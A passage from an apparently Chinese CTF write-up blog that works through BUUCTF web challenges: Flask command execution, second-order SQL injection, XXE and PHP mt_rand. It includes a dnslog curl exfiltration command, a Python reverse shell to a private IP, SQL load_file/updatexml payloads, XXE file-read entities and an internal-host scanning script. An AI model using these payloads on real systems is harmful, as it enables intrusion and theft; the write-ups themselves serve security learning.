class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;search.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/page&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">page</span>():</span><br><span class="line">    url = request.args.get(<span class="string">&quot;url&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> url.lower().startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">            res = urllib.urlopen(url)</span><br><span class="line">            value = res.read()</span><br><span class="line">            response = Response(value, mimetype=<span class="string">&#x27;application/octet-stream&#x27;</span>)</span><br><span class="line">            response.headers[<span class="string">&#x27;Content-Disposition&#x27;</span>] = <span class="string">&#x27;attachment; filename=beautiful.jpg&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> response</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            value = <span class="string">&quot;HACK ERROR!&quot;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        value = <span class="string">&quot;SOMETHING WRONG!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;search.html&#x27;</span>, res=value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/no_one_know_the_manager&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">manager</span>():</span><br><span class="line">    key = request.args.get(<span class="string">&quot;key&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(SECRET_KEY)</span><br><span class="line">    <span class="keyword">if</span> key == SECRET_KEY:</span><br><span class="line">        shell = request.args.get(<span class="string">&quot;shell&quot;</span>)</span><br><span class="line">        os.system(shell)</span><br><span class="line">        res = <span class="string">&quot;ok&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res = <span class="string">&quot;Wrong Key!&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8080</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h4><h5 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">发现了open一个secret.txt，但是没有关闭，而是用os.remove,那么我们就可以通过fd目录查看他的内容。page页即url查询的东西最终会写入beautiful.jpg以文件形式返回。/no_one_know_the_manager页则是有shell可以执行，只要key == SECRET_KEY，那么就可以执行，但是这里是没有回显的。随便传命令和key进去，发现没有print(SECRET_KEY)，而只有wrong key!,应该是被删除了。那我们前面有个secret.txt读一读</span><br></pre></td></tr></table></figure><p>&#x2F;page?url&#x3D;&#x2F;proc&#x2F;self&#x2F;fd&#x2F;3      最后一位爆破出来发现是3</p><p>得到L7KoQ22Yv4kvrYqNrxWQMRcXWJ4BGFMDnTEqgA6YT8w&#x3D;  应该就是key</p><p>试一下&#x2F;no_one_know_the_manager?key&#x3D;L7KoQ22Yv4kvrYqNrxWQMRcXWJ4BGFMDnTEqgA6YT8w&#x3D;&amp;shell&#x3D;ls</p><p>回显OK则正确。（如果出错，那么url编码一下key)</p><p>接下来由于是无回显的，那么需要在服务器反弹shell</p><p>由于没有服务器，所以参考网上用buu靶机来做。结果发现buu的靶机也不行。先搁置着（坑）</p><p>不过可以选择dnslog外带数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/no_one_know_the_manager?key=%32%4c%38%57%2f%39%51%51%4d%31%54%4b%49%70%37%66%61%73%6e%50%33%4c%41%2b%59%43%75%33%65%65%6f%47%69%70%6d%68%30%56%6f%49%46%4c%41%3d&amp;shell=curl%20`cat%09/flag`.yae4q7.dnslog.cn</span><br><span class="line">反引号内执行语句，由于ls /只有返回了var一个结果，其他结果返回不了，看其他wp说ls /|base64可以，但是试了一下不行，猜测/flag，刚好出了。</span><br><span class="line">别人的是curl 118.***.***.***/`ls /|base64`</span><br><span class="line"></span><br><span class="line">注意在发送数据时候，若是等一会则说明在解析dnslog地址，若是直接返回，那估计是命令敲错了，而且这种方法有些命令也执行不了，还是服务器香点</span><br><span class="line"></span><br><span class="line">还有一些用tee命令写到文件里面的，下次再试试，记录一下（坑）</span><br></pre></td></tr></table></figure><p><img src="C:\Users\wen\AppData\Roaming\Typora\typora-user-images\image-20230211152640844.png" alt="image-20230211152640844"></p><p>反弹shell</p><p>Python</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import</span><br><span class="line">os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;172.16.154.239&#x27;,7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://blog.csdn.net/Zero_Adam/article/details/114890384">https://blog.csdn.net/Zero_Adam/article/details/114890384</a></p><p><a href="https://blog.csdn.net/wuyaowangchuan/article/details/114540227">https://blog.csdn.net/wuyaowangchuan/article/details/114540227</a></p><p><a href="https://blog.csdn.net/Zero_Adam/article/details/114853022">https://blog.csdn.net/Zero_Adam/article/details/114853022</a>  （坑）</p><p><a href="https://blog.csdn.net/weixin_39890543/article/details/112989316">https://blog.csdn.net/weixin_39890543/article/details/112989316</a> （坑）</p><p><a href="https://blog.csdn.net/pop364/article/details/106083847">https://blog.csdn.net/pop364/article/details/106083847</a> （buu靶机）</p>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
            <tag> 坑 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN2019 华北赛区 Day1 Web5]CyberPunk</title>
      <link href="/2023/02/10/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web5-CyberPunk/"/>
      <url>/2023/02/10/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web5-CyberPunk/</url>
      
        <content type="html"><![CDATA[<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>打开是</p><p><img src="D:\My_Software\A_software\github_hexo\blog\themes\butterfly\source\img\博客图片\image-20230217181254447.png" alt="image-20230217181254447"></p><p>有提交订单，查询，还有修改，还有删除功能。</p><p>查看源代码发现提示<code>&lt;!--?file=?--&gt;</code></p><p>那么尝试读取源码php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php</p><p>读取源码</p><p>change.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;address&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$pattern</span> = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line">    <span class="variable">$user_name</span> = <span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>];</span><br><span class="line">    <span class="variable">$address</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&quot;address&quot;</span>]);</span><br><span class="line">    <span class="variable">$phone</span> = <span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$user_name</span>) || <span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$phone</span>))&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;no sql inject!&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;select * from `user` where `user_name`=&#x27;<span class="subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$fetch</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$fetch</span>) &amp;&amp; <span class="variable">$fetch</span>-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="variable">$row</span> = <span class="variable">$fetch</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;update `user` set `address`=&#x27;&quot;</span>.<span class="variable">$address</span>.<span class="string">&quot;&#x27;, `old_address`=&#x27;&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;address&#x27;</span>].<span class="string">&quot;&#x27; where `user_id`=&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;user_id&#x27;</span>];</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">print_r</span>(<span class="variable">$db</span>-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;订单修改成功&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;未找到订单!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;信息不全&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>其他源码同理。经审计发现，user_name和phone都做了严格的正则过滤，但对address只是很简单的转义，所以重点应该是在address这里。而且在change.php里面，还将输入的address和insert语句拼接起来。所以这里存在二次注入</p><h4 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h4><p>大概就是插入数据库的数据被转义，进入数据库却不会写入转义符号，就被还原成原来未转义的样子。然后再找到一处引用我们插入的危险数据的地方，同时引用没有对数据进行转义，则可以进行注入了。</p><p>研究语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;update `user` set `address`=&#x27;&quot;.$address.&quot;&#x27;, `old_address`=&#x27;&quot;.$<span class="type">row</span>[<span class="string">&#x27;address&#x27;</span>].&quot;&#x27; where `user_id`=&quot;.$<span class="type">row</span>[<span class="string">&#x27;user_id&#x27;</span>];</span><br><span class="line"></span><br><span class="line">而数据库  <span class="keyword">update</span> `<span class="keyword">user</span>` <span class="keyword">set</span> `address`<span class="operator">=</span>&quot;aaa&quot;, `address`<span class="operator">=</span>&quot;bbb&quot; <span class="keyword">where</span> `user_id`<span class="operator">=</span><span class="number">1</span>;</span><br><span class="line">则user_id<span class="operator">=</span><span class="number">1</span>的address会被设置成bbb</span><br><span class="line">所以可以构造payload: address<span class="operator">=</span>’,`address`<span class="operator">=</span>(<span class="keyword">sql</span>语句);#</span><br><span class="line">引号闭合原有语句的单引号，#号来闭合最后的单引号</span><br><span class="line">注意不是中文的符号 </span><br></pre></td></tr></table></figure><p>SQL语句随便写了，没有限制。查取数据找不到flag。</p><p>结果是读取文件，最终：’,<code>address</code>&#x3D;(select load_file(‘&#x2F;flag.txt’));#</p><p>1：先提交订单（地址是payload）然后再修改订单，地址仍然是payload，再查询订单</p><p>2：先提交订单（地址不是payload），后修改订单地址为payload两次，再查询订单</p><p>对第二种情况，然后修改订单地址为payload，此时，payload经过转义后认为安全，再被数据库去除转义符插入数据库。（此时查看菜单可以发现我们的地址已经是payload了），然后再改一下，则会触发update语句即拼接完后</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> <span class="keyword">update</span> `<span class="keyword">user</span>` <span class="keyword">set</span> `address`<span class="operator">=</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;</span>,`address`<span class="operator">=</span>(<span class="keyword">select</span> load_file(<span class="string">&#x27;/flag.txt&#x27;</span>));#</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;, `old_address`=&#x27;</span>$<span class="type">row</span>[<span class="string">&#x27;address&#x27;</span>]<span class="string">&#x27; where `user_id`=$row[&#x27;</span>user_id<span class="string">&#x27;];</span></span><br><span class="line"><span class="string">化简：</span></span><br><span class="line"><span class="string"> update `user` set `address`=&#x27;&#x27;,`address`=(select load_file(&#x27;</span><span class="operator">/</span>flag.txt<span class="string">&#x27;));#</span></span><br></pre></td></tr></table></figure><p>所以地址就直接变成flag了。</p><h4 id="或者报错注入"><a href="#或者报错注入" class="headerlink" title="或者报错注入"></a>或者报错注入</h4><p>payload</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#x27;</span><span class="operator">/</span>flag.txt<span class="string">&#x27;),1,20)),0x7e),1)#</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">where</span> user_id<span class="operator">=</span>updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> substr(load_file(<span class="string">&#x27;/flag.txt&#x27;</span>),<span class="number">20</span>,<span class="number">50</span>)),<span class="number">0x7e</span>),<span class="number">1</span>)#</span><br><span class="line">updataxml函数对字符串长度有限制，所以分段进行读取</span><br></pre></td></tr></table></figure><h3 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h3><p>常用的flag其实也就猜一猜txt,php，&#x2F;flag &#x2F;readflag</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://lonmar.cn/2021/02/02/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202018%5DComment/#0x03-addslashes">https://lonmar.cn/2021/02/02/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202018%5DComment/#0x03-addslashes</a></p><p><a href="https://blog.csdn.net/weixin_45551083/article/details/113576689">https://blog.csdn.net/weixin_45551083/article/details/113576689</a></p><p><a href="https://blog.csdn.net/fmyyy1/article/details/115365517">https://blog.csdn.net/fmyyy1/article/details/115365517</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[NCTF2019]True XML cookbook</title>
      <link href="/2023/02/10/NCTF2019-True-XML-cookbook/"/>
      <url>/2023/02/10/NCTF2019-True-XML-cookbook/</url>
      
        <content type="html"><![CDATA[<h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><p>进入是登录框，查看源代码发现是传输xml信息，随便填信息然后抓包也发现了xml信息 <user><username>admin</username><password>1</password></user></p><h4 id="尝试进行xxe注入"><a href="#尝试进行xxe注入" class="headerlink" title="尝试进行xxe注入"></a>尝试进行xxe注入</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">name</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span>]</span></span><br><span class="line"><span class="meta">&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;name;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>1<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line">分别读取/etc/hosts /flag 等常见的</span><br><span class="line">读不到，那么尝试读一下源码：（在做的过程中发现报错，可知路径）</span><br><span class="line">file:///var/www/html/doLogin.php  读不到</span><br><span class="line">php://filter/read=convert.base64-encode/resource=/var/www/html/doLogin.php 读到了，但是没什么信息，利用源码的账号密码登录也没用。</span><br><span class="line"></span><br><span class="line">探测内网主机 /proc/net/arp /etc/hosts</span><br><span class="line">发现有另外一个ip</span><br><span class="line">用http协议访问</span><br><span class="line">http://10.128.253.1 发现报错，尝试进行最后一位c段爆破</span><br><span class="line">最后访问成功得到flag（没做出来，怀疑是buu问题）</span><br></pre></td></tr></table></figure><h4 id="记录"><a href="#记录" class="headerlink" title="记录"></a>记录</h4><p>题目没做出来，利用http访问会很久，然后显示超时链接。</p><p>&#x2F;etc&#x2F;hosts下开两个环境，一个有ip一个没有ip，&#x2F;proc&#x2F;net&#x2F;arp里一个有一个ip，一个两个ip。</p><p>都访问不了。</p><p>贴个网上的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> res</span><br><span class="line"><span class="comment"># url=&quot;http://0c8016ed-ef08-4127-ad08-37c2bcce842e.node4.buuoj.cn:81/doLogin.php&quot;</span></span><br><span class="line">rawPayload=<span class="string">&#x27;&lt;?xml version=&quot;1.0&quot;?&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;!DOCTYPE user [&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;!ENTITY payload1 SYSTEM &quot;http://169.254.1.&#123;&#125;&quot;&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;]&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;user&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;username&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&amp;payload1;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;/username&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;password&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;23&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;/password&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;/user&gt;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">255</span>,<span class="number">500</span>):</span><br><span class="line">    payload=rawPayload.<span class="built_in">format</span>(i)</span><br><span class="line">    <span class="comment">#payload=rawPayload</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>(<span class="string">&quot;#&#123;&#125; =&gt;&quot;</span>).<span class="built_in">format</span>(i),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        resp=res.post(url,data=payload,timeout=<span class="number">0.3</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(resp.text,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.cnblogs.com/Article-kelp/p/16026652.html">https://www.cnblogs.com/Article-kelp/p/16026652.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
            <tag> 坑 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[GWCTF 2019]枯燥的抽奖</title>
      <link href="/2023/02/09/GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96/"/>
      <url>/2023/02/09/GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96/</url>
      
        <content type="html"><![CDATA[<h3 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h3><h4 id="一些函数"><a href="#一些函数" class="headerlink" title="一些函数"></a>一些函数</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">session_start() 会创建新会话或者重用现有会话。</span><br><span class="line">$_SESSION — Session 变量，当前脚本可用 SESSION 变量的数组。</span><br><span class="line">rand() 函数返回随机整数。</span><br><span class="line">mt_srand(seed)函数通过分发seed种子，然后种子有了后，靠mt_rand()生成随机数。</span><br></pre></td></tr></table></figure><h4 id="PHP-mt-rand函数"><a href="#PHP-mt-rand函数" class="headerlink" title="PHP mt_rand函数"></a>PHP mt_rand函数</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">产生伪随机数。它产生随机数值的平均速度比 libc 提供的 rand() 快四倍。由可确定的函数，通过一个种子产生的伪随机数。可以通过种子/已产生的随机数来获得接下来的序列信息。有两个可选参数 min 和 max，如果没有提供可选参数，mt_rand函数将返回返回 0 到 mt_getrandmax() 之间的伪随机数。</span><br><span class="line"></span><br><span class="line">破解工具：php_mt_seed是一个破解mt_rand函数seed的工具。参数说明：四个参数（高级模式）下，前两个参数表示mt_rand第一次输出的区间，后两个参数表示mt_rand输出的区间。</span><br><span class="line"></span><br><span class="line">link：https://www.freebuf.com/vuls/192012.html</span><br></pre></td></tr></table></figure><h3 id="解题："><a href="#解题：" class="headerlink" title="解题："></a>解题：</h3><h4 id="Ctrl-U查看源代码（坑）"><a href="#Ctrl-U查看源代码（坑）" class="headerlink" title="Ctrl+U查看源代码（坑）"></a>Ctrl+U查看源代码（坑）</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">$(<span class="variable language_">document</span>).<span class="title function_">ready</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    $(<span class="string">&quot;#div1&quot;</span>).<span class="title function_">load</span>(<span class="string">&quot;check.php #p1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        $(<span class="string">&quot;.close&quot;</span>).<span class="title function_">click</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        $(<span class="string">&quot;#myAlert&quot;</span>).<span class="title function_">hide</span>();</span><br><span class="line">    &#125;);     </span><br><span class="line"></span><br><span class="line">    $(<span class="string">&quot;#button1&quot;</span>).<span class="title function_">click</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    $(<span class="string">&quot;#myAlert&quot;</span>).<span class="title function_">hide</span>();</span><br><span class="line">    guess=$(<span class="string">&quot;input&quot;</span>).<span class="title function_">val</span>();</span><br><span class="line">$.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">   <span class="attr">type</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">   <span class="attr">url</span>: <span class="string">&quot;check.php&quot;</span>,</span><br><span class="line">   <span class="attr">data</span>: <span class="string">&quot;num=&quot;</span>+guess,</span><br><span class="line">   <span class="attr">success</span>: <span class="keyword">function</span>(<span class="params">msg</span>)&#123;</span><br><span class="line">     $(<span class="string">&quot;#div2&quot;</span>).<span class="title function_">append</span>(msg);</span><br><span class="line">     alertmsg = $(<span class="string">&quot;#flag&quot;</span>).<span class="title function_">text</span>(); </span><br><span class="line">     <span class="keyword">if</span>(alertmsg==<span class="string">&quot;没抽中哦，再试试吧&quot;</span>)&#123;</span><br><span class="line">      $(<span class="string">&quot;#myAlert&quot;</span>).<span class="title function_">attr</span>(<span class="string">&quot;class&quot;</span>,<span class="string">&quot;alert alert-warning&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span>($(<span class="string">&quot;#new&quot;</span>).<span class="title function_">text</span>()==<span class="string">&quot;&quot;</span>)</span><br><span class="line">     $(<span class="string">&quot;#new&quot;</span>).<span class="title function_">append</span>(alertmsg);</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">else</span>&#123;     </span><br><span class="line">     $(<span class="string">&quot;#myAlert&quot;</span>).<span class="title function_">attr</span>(<span class="string">&quot;class&quot;</span>,<span class="string">&quot;alert alert-success&quot;</span>);</span><br><span class="line">     <span class="keyword">if</span>($(<span class="string">&quot;#new&quot;</span>).<span class="title function_">text</span>()==<span class="string">&quot;&quot;</span>)</span><br><span class="line">     $(<span class="string">&quot;#new&quot;</span>).<span class="title function_">append</span>(alertmsg);</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">   &#125;</span><br><span class="line">&#125;); </span><br><span class="line">$(<span class="string">&quot;#myAlert&quot;</span>).<span class="title function_">show</span>();</span><br><span class="line">$(<span 